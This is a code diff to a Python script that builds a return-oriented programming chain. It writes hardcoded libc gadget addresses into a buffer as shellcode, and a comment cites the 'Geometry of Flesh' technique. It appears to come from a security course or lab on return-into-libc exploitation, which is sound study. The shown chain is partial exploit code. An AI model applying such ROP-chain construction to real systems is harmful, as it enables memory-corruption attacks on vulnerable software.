@@ -18,26 +18,29 @@ class GenerateShellcode:
         self.rop_chain.parse_gadgets_file()
 
     def store_word(self, word):
-        print(hex(word))
         num_bytes = 4
         reversed_bytes = word.to_bytes(num_bytes, byteorder='little')
 
         for i in range(num_bytes):  # Iterate over each of the four bytes in the word
             index = self.buffer_offset + num_bytes*self.buffer_word_index + i
             self.buffer[index] = reversed_bytes[i]
-            print("Index: " + str(index) + " => " + hex(reversed_bytes[i]))
 
         self.buffer_word_index += 1
 
     def store_gadget(self, gadget_str):
         libc_gadget = self.rop_chain.get_gadget(gadget_str) + self.libc_offset
+        print(gadget_str + " => " + hex(libc_gadget))
         self.store_word(libc_gadget)
 
     def get_shellcode(self):
-        self.store_gadget("xor eax, eax ; ret ;")        # e.g. 0xb7e98c6c
-        self.store_gadget("pop ecx ; pop edx ; ret ;")   # 0xb7e34c6c
-        self.store_word(0x0b0b0b0b)
+        self.store_word(0xb7e3579c)  # xor eax, eax ; ret ;
+        self.store_word(0xb7ebe377)  # pop ecx ; ret ;
 
+        # Geometry of Flesh uses movl %eax, 24(%edx), but this gadget does not exist in our libc
+        # We need edx to point to a NULL pointer
+        self.store_word(0x0b0b0b0b)
+        self.store_word(0xb7e34c6d) # pop edx ; ret ;
+        self.store_word(0x0)
 
 if __name__ == "__main__":
     arg_parser = argparse.ArgumentParser(description="Create a ROP chain using the gadgets found")
